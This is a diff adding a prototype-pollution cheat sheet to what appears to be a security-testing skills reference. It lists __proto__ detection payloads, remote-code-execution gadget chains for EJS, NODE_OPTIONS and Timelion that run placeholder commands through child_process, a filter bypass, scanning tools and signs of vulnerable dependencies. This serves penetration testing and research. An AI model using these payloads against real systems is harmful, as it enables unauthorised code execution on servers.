@@ -1029,3 +1029,58 @@ References:
 
 - `references/tools.md` — full tool installation and usage guide
 - `references/patterns.md` — complete regex cheatsheet for secret and endpoint hunting
+
+
+---
+
+## From hack-skills: Prototype Pollution (Advanced)
+
+### Server-Side Detection Signals (Black-Box)
+
+| Payload | Observable Signal |
+|---|---|
+| `{"__proto__":{"json spaces":" "}}` | JSON responses gain extra spaces (JSON.stringify spacing polluted) |
+| `{"__proto__":{"parameterLimit":1}}` | Multi-parameter parsing breaks in follow-up requests |
+| `{"__proto__":{"ignoreQueryPrefix":true}}` | `??foo=bar` URLs accepted or behavior changes |
+| `{"__proto__":{"exposedHeaders":["foo"]}}` | CORS responses include unexpected `foo` headers |
+| `{"__proto__":{"status":510}}` | Response status changes to 510 or other abnormal code |
+
+**Key**: send pollution request first, then a CLEAN request to observe persistence. Worker lifecycle affects global visibility.
+
+### Exploitation Gadget Chains
+
+```javascript
+// EJS template engine RCE (if EJS options read from prototype):
+{"__proto__":{"client":1,"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').exec('COMMAND')"}}
+
+// Generic constructor path (bypasses __proto__ filtering):
+{"constructor":{"prototype":{"polluted":true}}}
+
+// NODE_OPTIONS injection (if spawn/fork reads options from prototype):
+{"__proto__":{"env":{"NODE_OPTIONS":"--require /proc/self/fd/999"}}}
+
+// Timelion/historical expression chain:
+.es(*).props(label.__proto__.env.X='require("child_process").exec("COMMAND")')
+```
+
+**Chain mindset**: pollution → dependency reads `obj.settings.xxx` without `hasOwnProperty` → gadget executes.
+
+### Tools for Prototype Pollution Research
+
+| Tool | Purpose |
+|---|---|
+| `yeswehack/pp-finder` | Locate PP-prone merge points in code |
+| `BlackFan/client-side-prototype-pollution` | Browser-side PP cases and payloads |
+| `msrkp/PPScan` | Automated scanning/verification |
+| `portswigger/server-side-prototype-pollution` | Burp extension + methodology |
+
+### Decision Signals (When to Prioritize PP)
+
+```
+Priority HIGH when you see:
+- lodash.merge, deep-extend, hoek.applyToDefaults in dependencies
+- qs or query-string library parsing nested object notation (?a[__proto__][b]=1)
+- body-parser with extended=true
+- JSON.parse + Object.assign pattern
+- Any merge/assign over user-supplied keys without hasOwnProperty guard
+```
